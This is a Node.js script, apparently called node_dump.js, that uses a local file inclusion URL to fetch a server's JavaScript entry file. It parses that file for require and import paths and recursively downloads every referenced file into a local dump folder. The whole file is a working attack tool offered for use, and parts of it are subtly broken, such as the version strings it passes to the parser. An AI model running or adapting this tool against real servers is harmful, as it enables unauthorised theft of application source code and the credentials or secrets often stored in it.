const fs = require('fs');
const path = require('path')
const walk = require('acorn-walk');
const acorn = require('acorn');
const { exit } = require('process');
const prompt = require('prompt-sync')();
const http = require('http')

function extractImportStatementsFromFile(filePath, ecmaVersion) {
  let source_type = 'script';
  let importStatements = [];
  let ast;
  const fileContent = fs.readFileSync(filePath, 'utf8');
  try {
    ast = acorn.parse(fileContent, { sourceType: source_type, ecmaVersion: ecmaVersion });
  } catch {
    source_type = 'module'
    ast = acorn.parse(fileContent, { sourceType: source_type, ecmaVersion: ecmaVersion });
  }
  if (source_type === 'script') {
    walk.simple(ast, {
      VariableDeclaration(node) {
          if (node.declarations[0].init.callee.name === 'require'){
            importStatements.push(node.declarations[0].init.arguments[0].value)
          }
        }
      });
  } else {
    walk.simple(ast, {
      ImportDeclaration(node) {
        importStatements.push(node.source.value);
      },
      ImportExpression(node) {
        importStatements.push(node.source.value);
      }
    });
  }
  importStatements = importStatements.filter((str) => str.includes('/'))
  return importStatements;
}

function runRecourse(url, index_file) {
  if (index_file.endsWith('.js') === false) {
    index_file += '.js';
  }

  const directoryPath = './dump';
  const filePath = `${directoryPath}/${index_file}`;
  if (!fs.existsSync(path.dirname(filePath))) {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
  }

  const fileStream = fs.createWriteStream(filePath);
  const request = http.get(`${url}${index_file}`, function (response) {
    let responseData = false;
    response.on('data', function (data) {
      responseData = true;

      fileStream.write(data);
    });

    response.on('end', function () {
      fileStream.end();
      if (responseData) {
        console.log(`File ${index_file} found.`);
        const importStatements = extractImportStatementsFromFile(`${directoryPath}/${index_file}`, versions[version]);
        for (const import_stmt of importStatements) {
          runRecourse(url, import_stmt);
        }
      } else {
        console.log(`No data received for ${index_file}.`);
      }
    });
  });

  request.on('error', function (err) {
    console.error('Error occurred while downloading file:', err);
  });
}

if (process.argv.length < 3 || process.argv.length > 3) {
  console.log(`Usage: node node_dump.js lfi_url`)
  exit()
}
var url = process.argv[2]

const versions = {
  a: 3,
  b: 5,
  c: '6 (2015)',
  d: '7 (2017)',
  e: '8 (2017)',
  f: '9 (2018)',
  g: '10 (2019)',
  h: '11 (2020)',
  i: '12 (2021)',
  j: '13 (2022)',
  k: '14 (2023)',
  l: 'latest'
}
console.log('Choose ecmaVersion:');
console.log(JSON.parse(JSON.stringify(versions)))
var version = prompt('> ')
var index_file = prompt('Index file name: ')

runRecourse(url, index_file)